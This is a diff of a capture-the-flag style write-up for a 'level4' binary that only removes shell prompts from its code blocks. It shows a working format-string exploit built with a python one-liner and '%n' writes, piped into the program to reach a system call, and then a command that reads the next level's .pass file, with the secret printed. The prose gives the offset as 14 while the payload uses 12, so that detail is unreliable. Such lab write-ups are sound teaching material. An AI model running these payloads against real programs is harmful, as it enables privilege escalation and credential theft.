@@ -24,11 +24,11 @@ AAAA 0xb7ff26b0 0xbffff764 0xb7fd0ff4 (nil) (nil) 0xbffff728 0x804848d 0xbffff52
 ```
 The offset is 14. Now we construct the payload for exploitation:
 ```
-$> python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload4
-$> cat /tmp/payload4 - | ./level4
+python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /tmp/payload4
+cat /tmp/payload4 - | ./level4
 ```
 Running the payload should overwrite the variable and trigger the system call with the desired argument, revealing the content of the .pass file:
 ```
-$ cat /home/user/level5/.pass
+cat /home/user/level5/.pass
 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
 ```
